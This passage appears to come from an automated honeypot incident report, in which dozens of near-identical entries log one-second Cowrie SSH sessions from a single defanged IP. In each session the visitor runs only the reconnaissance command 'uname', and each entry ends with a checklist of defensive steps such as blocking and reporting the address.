| `2026-07-04 15:03:11` | `cowrie.command.input` |
| `2026-07-04 15:03:11` | `cowrie.log.closed` |
| `2026-07-04 15:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95e047a2caad

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:13` | `cowrie.session.connect` |
| `2026-07-04 15:03:13` | `cowrie.client.version` |
| `2026-07-04 15:03:13` | `cowrie.client.kex` |
| `2026-07-04 15:03:14` | `cowrie.login.success` |
| `2026-07-04 15:03:14` | `cowrie.session.params` |
| `2026-07-04 15:03:14` | `cowrie.command.input` |
| `2026-07-04 15:03:14` | `cowrie.log.closed` |
| `2026-07-04 15:03:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc962cc5c8f1

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:16` | `cowrie.session.connect` |
| `2026-07-04 15:03:16` | `cowrie.client.version` |
| `2026-07-04 15:03:16` | `cowrie.client.kex` |
| `2026-07-04 15:03:17` | `cowrie.login.success` |
| `2026-07-04 15:03:18` | `cowrie.session.params` |
| `2026-07-04 15:03:18` | `cowrie.command.input` |
| `2026-07-04 15:03:18` | `cowrie.log.closed` |
| `2026-07-04 15:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24eeb28175bf

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:20` | `cowrie.session.connect` |
| `2026-07-04 15:03:20` | `cowrie.client.version` |
| `2026-07-04 15:03:20` | `cowrie.client.kex` |
| `2026-07-04 15:03:20` | `cowrie.login.success` |
| `2026-07-04 15:03:21` | `cowrie.session.params` |
| `2026-07-04 15:03:21` | `cowrie.command.input` |
| `2026-07-04 15:03:21` | `cowrie.log.closed` |
| `2026-07-04 15:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56b354920152

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:23` | `cowrie.session.connect` |
| `2026-07-04 15:03:23` | `cowrie.client.version` |
| `2026-07-04 15:03:23` | `cowrie.client.kex` |
| `2026-07-04 15:03:23` | `cowrie.login.success` |
| `2026-07-04 15:03:24` | `cowrie.session.params` |
| `2026-07-04 15:03:24` | `cowrie.command.input` |
| `2026-07-04 15:03:24` | `cowrie.log.closed` |
| `2026-07-04 15:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf4fd87040c2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:26` | `cowrie.session.connect` |
| `2026-07-04 15:03:26` | `cowrie.client.version` |
| `2026-07-04 15:03:27` | `cowrie.client.kex` |
| `2026-07-04 15:03:27` | `cowrie.login.success` |
| `2026-07-04 15:03:28` | `cowrie.session.params` |
| `2026-07-04 15:03:28` | `cowrie.command.input` |
| `2026-07-04 15:03:28` | `cowrie.log.closed` |
| `2026-07-04 15:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7673d3d529c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:30` | `cowrie.session.connect` |
| `2026-07-04 15:03:30` | `cowrie.client.version` |
| `2026-07-04 15:03:30` | `cowrie.client.kex` |
| `2026-07-04 15:03:30` | `cowrie.login.success` |
| `2026-07-04 15:03:31` | `cowrie.session.params` |
| `2026-07-04 15:03:31` | `cowrie.command.input` |
| `2026-07-04 15:03:31` | `cowrie.log.closed` |
| `2026-07-04 15:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95762af01304

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:33` | `cowrie.session.connect` |
| `2026-07-04 15:03:33` | `cowrie.client.version` |
| `2026-07-04 15:03:33` | `cowrie.client.kex` |
| `2026-07-04 15:03:34` | `cowrie.login.success` |
| `2026-07-04 15:03:34` | `cowrie.session.params` |
| `2026-07-04 15:03:34` | `cowrie.command.input` |
| `2026-07-04 15:03:34` | `cowrie.log.closed` |
| `2026-07-04 15:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e66c6275d527

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:37` | `cowrie.session.connect` |
| `2026-07-04 15:03:37` | `cowrie.client.version` |
| `2026-07-04 15:03:37` | `cowrie.client.kex` |
| `2026-07-04 15:03:37` | `cowrie.login.success` |
| `2026-07-04 15:03:38` | `cowrie.session.params` |
| `2026-07-04 15:03:38` | `cowrie.command.input` |
| `2026-07-04 15:03:38` | `cowrie.log.closed` |
| `2026-07-04 15:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48dfc10e43b9

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:40` | `cowrie.session.connect` |
| `2026-07-04 15:03:40` | `cowrie.client.version` |
| `2026-07-04 15:03:40` | `cowrie.client.kex` |
| `2026-07-04 15:03:40` | `cowrie.login.success` |
| `2026-07-04 15:03:41` | `cowrie.session.params` |
| `2026-07-04 15:03:41` | `cowrie.command.input` |
| `2026-07-04 15:03:41` | `cowrie.log.closed` |
| `2026-07-04 15:03:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3737ea49535

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:43` | `cowrie.session.connect` |
| `2026-07-04 15:03:43` | `cowrie.client.version` |
| `2026-07-04 15:03:43` | `cowrie.client.kex` |
| `2026-07-04 15:03:44` | `cowrie.login.success` |
| `2026-07-04 15:03:45` | `cowrie.session.params` |
| `2026-07-04 15:03:45` | `cowrie.command.input` |
| `2026-07-04 15:03:45` | `cowrie.log.closed` |
| `2026-07-04 15:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce1282545e62

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:47` | `cowrie.session.connect` |
| `2026-07-04 15:03:47` | `cowrie.client.version` |
| `2026-07-04 15:03:47` | `cowrie.client.kex` |
| `2026-07-04 15:03:47` | `cowrie.login.success` |
| `2026-07-04 15:03:48` | `cowrie.session.params` |
| `2026-07-04 15:03:48` | `cowrie.command.input` |
| `2026-07-04 15:03:48` | `cowrie.log.closed` |
| `2026-07-04 15:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e428be8d4e4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:50` | `cowrie.session.connect` |
| `2026-07-04 15:03:50` | `cowrie.client.version` |
| `2026-07-04 15:03:50` | `cowrie.client.kex` |
| `2026-07-04 15:03:50` | `cowrie.login.success` |
| `2026-07-04 15:03:51` | `cowrie.session.params` |
| `2026-07-04 15:03:51` | `cowrie.command.input` |
| `2026-07-04 15:03:51` | `cowrie.log.closed` |
| `2026-07-04 15:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-807fcc62f8fe

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:53` | `cowrie.session.connect` |
| `2026-07-04 15:03:53` | `cowrie.client.version` |
| `2026-07-04 15:03:53` | `cowrie.client.kex` |
| `2026-07-04 15:03:54` | `cowrie.login.success` |
| `2026-07-04 15:03:55` | `cowrie.session.params` |
| `2026-07-04 15:03:55` | `cowrie.command.input` |
| `2026-07-04 15:03:55` | `cowrie.log.closed` |
| `2026-07-04 15:03:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fbba83dc5f5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:03 |
| **Last Seen** | 2026-07-04 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:03:57` | `cowrie.session.connect` |
| `2026-07-04 15:03:57` | `cowrie.client.version` |
| `2026-07-04 15:03:57` | `cowrie.client.kex` |
| `2026-07-04 15:03:57` | `cowrie.login.success` |
| `2026-07-04 15:03:58` | `cowrie.session.params` |
| `2026-07-04 15:03:58` | `cowrie.command.input` |
| `2026-07-04 15:03:58` | `cowrie.log.closed` |
| `2026-07-04 15:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5d57d34f1b8

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:00` | `cowrie.session.connect` |
| `2026-07-04 15:04:00` | `cowrie.client.version` |
| `2026-07-04 15:04:00` | `cowrie.client.kex` |
| `2026-07-04 15:04:00` | `cowrie.login.success` |
| `2026-07-04 15:04:01` | `cowrie.session.params` |
| `2026-07-04 15:04:01` | `cowrie.command.input` |
| `2026-07-04 15:04:01` | `cowrie.log.closed` |
| `2026-07-04 15:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-648432de92fc

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:03` | `cowrie.session.connect` |
| `2026-07-04 15:04:03` | `cowrie.client.version` |
| `2026-07-04 15:04:03` | `cowrie.client.kex` |
| `2026-07-04 15:04:04` | `cowrie.login.success` |
| `2026-07-04 15:04:05` | `cowrie.session.params` |
| `2026-07-04 15:04:05` | `cowrie.command.input` |
| `2026-07-04 15:04:05` | `cowrie.log.closed` |
| `2026-07-04 15:04:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-507d160e9efa

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:07` | `cowrie.session.connect` |
| `2026-07-04 15:04:07` | `cowrie.client.version` |
| `2026-07-04 15:04:07` | `cowrie.client.kex` |
| `2026-07-04 15:04:07` | `cowrie.login.success` |
| `2026-07-04 15:04:08` | `cowrie.session.params` |
| `2026-07-04 15:04:08` | `cowrie.command.input` |
| `2026-07-04 15:04:08` | `cowrie.log.closed` |
| `2026-07-04 15:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c2fe9d1452c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:10` | `cowrie.session.connect` |
| `2026-07-04 15:04:10` | `cowrie.client.version` |
| `2026-07-04 15:04:10` | `cowrie.client.kex` |
| `2026-07-04 15:04:11` | `cowrie.login.success` |
| `2026-07-04 15:04:11` | `cowrie.session.params` |
| `2026-07-04 15:04:11` | `cowrie.command.input` |
| `2026-07-04 15:04:11` | `cowrie.log.closed` |
| `2026-07-04 15:04:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59d8cd1a9681

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:14` | `cowrie.session.connect` |
| `2026-07-04 15:04:14` | `cowrie.client.version` |
| `2026-07-04 15:04:14` | `cowrie.client.kex` |
| `2026-07-04 15:04:14` | `cowrie.login.success` |
| `2026-07-04 15:04:15` | `cowrie.session.params` |
| `2026-07-04 15:04:15` | `cowrie.command.input` |
| `2026-07-04 15:04:15` | `cowrie.log.closed` |
| `2026-07-04 15:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cdc793f66a2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:17` | `cowrie.session.connect` |
| `2026-07-04 15:04:17` | `cowrie.client.version` |
| `2026-07-04 15:04:17` | `cowrie.client.kex` |
| `2026-07-04 15:04:17` | `cowrie.login.success` |
| `2026-07-04 15:04:18` | `cowrie.session.params` |
| `2026-07-04 15:04:18` | `cowrie.command.input` |
| `2026-07-04 15:04:18` | `cowrie.log.closed` |
| `2026-07-04 15:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dc16b18eff5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:20` | `cowrie.session.connect` |
| `2026-07-04 15:04:20` | `cowrie.client.version` |
| `2026-07-04 15:04:20` | `cowrie.client.kex` |
| `2026-07-04 15:04:21` | `cowrie.login.success` |
| `2026-07-04 15:04:22` | `cowrie.session.params` |
| `2026-07-04 15:04:22` | `cowrie.command.input` |
| `2026-07-04 15:04:22` | `cowrie.log.closed` |
| `2026-07-04 15:04:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30c8d625d768

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:24` | `cowrie.session.connect` |
| `2026-07-04 15:04:24` | `cowrie.client.version` |
| `2026-07-04 15:04:24` | `cowrie.client.kex` |
| `2026-07-04 15:04:24` | `cowrie.login.success` |
| `2026-07-04 15:04:25` | `cowrie.session.params` |
| `2026-07-04 15:04:25` | `cowrie.command.input` |
| `2026-07-04 15:04:25` | `cowrie.log.closed` |
| `2026-07-04 15:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23db04b01535

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:27` | `cowrie.session.connect` |
| `2026-07-04 15:04:27` | `cowrie.client.version` |
| `2026-07-04 15:04:27` | `cowrie.client.kex` |
| `2026-07-04 15:04:28` | `cowrie.login.success` |
| `2026-07-04 15:04:28` | `cowrie.session.params` |
| `2026-07-04 15:04:28` | `cowrie.command.input` |
| `2026-07-04 15:04:28` | `cowrie.log.closed` |
| `2026-07-04 15:04:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c71c4f0a92db

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:30` | `cowrie.session.connect` |
| `2026-07-04 15:04:30` | `cowrie.client.version` |
| `2026-07-04 15:04:31` | `cowrie.client.kex` |
| `2026-07-04 15:04:31` | `cowrie.login.success` |
| `2026-07-04 15:04:32` | `cowrie.session.params` |
| `2026-07-04 15:04:32` | `cowrie.command.input` |
| `2026-07-04 15:04:32` | `cowrie.log.closed` |
| `2026-07-04 15:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-902c52c07b68

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:04:34` | `cowrie.session.connect` |
| `2026-07-04 15:04:34` | `cowrie.client.version` |
| `2026-07-04 15:04:34` | `cowrie.client.kex` |
| `2026-07-04 15:04:34` | `cowrie.login.success` |
| `2026-07-04 15:04:35` | `cowrie.session.params` |
| `2026-07-04 15:04:35` | `cowrie.command.input` |
| `2026-07-04 15:04:35` | `cowrie.log.closed` |
| `2026-07-04 15:04:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c05c7a3fd209

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:04 |
| **Last Seen** | 2026-07-04 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
